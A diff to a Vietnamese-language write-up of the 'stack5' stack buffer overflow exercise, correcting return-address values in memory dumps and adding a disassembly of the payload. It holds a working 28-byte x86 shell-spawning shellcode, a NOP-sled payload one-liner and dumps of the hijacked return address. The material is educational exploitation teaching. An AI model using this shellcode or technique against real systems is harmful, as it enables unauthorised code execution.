@@ -54,7 +54,7 @@ Bộ nhớ sau khi gọi hàm `gets` sẽ như sau. Phân biệt bằng màu: <s
 0xbffff770:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
 0xbffff780:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
 0xbffff790:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
-0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      <span style="color:orangered">0xbffff780</span>
+0xbffff7a0:     0xbffff760      0xbffff760      0xbffff760      <span style="color:orangered">0xbffff760</span>
 </pre>
 Sau khi được nạp giá trị mới, <span style="color:orangered">địa chỉ</span> và <span style="color:yellow">lệnh</span> sau sẽ được thực thi ngay khi stack5 return.
 <pre class="memory">
@@ -63,7 +63,7 @@ Sau khi được nạp giá trị mới, <span style="color:orangered">địa ch
 0xbffff770:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
 0xbffff780:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
 0xbffff790:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
-0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      0xbffff780
+0xbffff7a0:     0xbffff760      0xbffff760      0xbffff760      0xbffff760
 
 <span style="color:orangered">0xbffff760</span>:     <span style="color:yellow">int3</span>
 </pre>
@@ -79,7 +79,7 @@ Sau đây là đoạn shellcode dài 28 byte dùng để chạy chương trình 
 ```
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 ```
-Lưu ý, đoạn chương trình này cần được chạy chính xác từ đầu đến cuối.
+Lưu ý, đoạn chương trình này cần được chạy từ đầu đến cuối.
 Nếu biết chính xác vị trí trên bộ nhớ lưu shellcode này, ta sẽ gán địa chỉ đó cho `eip` của caller.
 Một kỹ thuật khác cho phép chọn địa chỉ `eip` một cách linh hoạt hơn là dùng chuỗi `nop` (có opcode `0x90`).
 Đây là một trong số ít lệnh có thể dùng mà không sợ shellcode không bị lỗi hoặc không thể chạm đến.
@@ -94,20 +94,51 @@ python -c "print '\x90' * 36 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
 ```
 <pre class="memory">
 0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
-0xbffff760:     0xb7fd7ff4      0x0804958c      0xbffff778      0x080482c4
-0xbffff770:     0xb7ff1040      0x0804958c      0xbffff7a8      0x08048409
-0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x080483f0      0xbffff7a8
-0xbffff790:     0xb7ec6365      0xb7ff1040      0x080483fb      0xb7fd7ff4
-0xbffff7a0:     0x080483f0      0x00000000      0xbffff828      0xb7eadc76
+0xbffff760:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x0804958c</span>      <span style="color:aqua">0xbffff778</span>      <span style="color:aqua">0x080482c4</span>
+0xbffff770:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x0804958c</span>      <span style="color:aqua">0xbffff7a8</span>      <span style="color:aqua">0x08048409</span>
+0xbffff780:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x080483f0</span>      <span style="color:aqua">0xbffff7a8</span>
+0xbffff790:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x080483fb</span>      <span style="color:aqua">0xb7fd7ff4</span>
+0xbffff7a0:     0x080483f0      0x00000000      0xbffff828      <span style="color:orangered">0xb7eadc76</span>
 </pre>
 
 <pre class="memory">
 0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
+0xbffff760:     <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>
+0xbffff770:     <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>
+0xbffff780:     <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x6850c031</span>      <span style="color:aqua">0x68732f2f</span>      <span style="color:aqua">0x69622f68</span>
+0xbffff790:     <span style="color:aqua">0x89e3896e</span>      <span style="color:aqua">0xb0c289c1</span>      <span style="color:aqua">0x3180cd0b</span>      <span style="color:aqua">0x80cd40c0</span>
+0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      <span style="color:orangered">0xbffff780</span>
+</pre>
+
+Phân biệt <span style="color:orangered">địa chỉ</span> và <span style="color:yellow">lệnh</span> sau sẽ được thực thi ngay khi stack5 return.
+<pre class="memory">
+0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
 0xbffff760:     0x90909090      0x90909090      0x90909090      0x90909090
 0xbffff770:     0x90909090      0x90909090      0x90909090      0x90909090
-0xbffff780:     0x90909090      0x6850c031      0x68732f2f      0x69622f68
+<span style="color:orangered">0xbffff780</span>:     0x<span style="color:yellow">90</span>909090      0x6850c031      0x68732f2f      0x69622f68
 0xbffff790:     0x89e3896e      0xb0c289c1      0x3180cd0b      0x80cd40c0
 0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      0xbffff780
+</pre>
+
+Sau đây là memory dưới dạng asm instruction.
+Phân biệt <span style="color:orangered">địa chỉ eip mới</span>, <span style="color:yellow">lệnh</span> được thực thi ngay khi stack5 return, và <span style="color:springgreen">shellcode</span>.
+<pre class="memory">
+<span style="color:orangered">0xbffff780</span>:     <span style="color:yellow">nop</span>
+0xbffff781:     nop
+0xbffff782:     nop
+0xbffff783:     nop
+<span style="color:springgreen">0xbffff784</span>:     <span style="color:springgreen">xor    eax,eax</span>
+<span style="color:springgreen">0xbffff786</span>:     <span style="color:springgreen">push   eax</span>
+<span style="color:springgreen">0xbffff787</span>:     <span style="color:springgreen">push   0x68732f2f</span>
+<span style="color:springgreen">0xbffff78c</span>:     <span style="color:springgreen">push   0x6e69622f</span>
+<span style="color:springgreen">0xbffff791</span>:     <span style="color:springgreen">mov    ebx,esp</span>
+<span style="color:springgreen">0xbffff793</span>:     <span style="color:springgreen">mov    ecx,eax</span>
+<span style="color:springgreen">0xbffff795</span>:     <span style="color:springgreen">mov    edx,eax</span>
+<span style="color:springgreen">0xbffff797</span>:     <span style="color:springgreen">mov    al,0xb</span>
+<span style="color:springgreen">0xbffff799</span>:     <span style="color:springgreen">int    0x80</span>
+<span style="color:springgreen">0xbffff79b</span>:     <span style="color:springgreen">xor    eax,eax</span>
+<span style="color:springgreen">0xbffff79d</span>:     <span style="color:springgreen">inc    eax</span>
+<span style="color:springgreen">0xbffff79e</span>:     <span style="color:springgreen">int    0x80</span>
 </pre>
 ## Ref
 ```bash
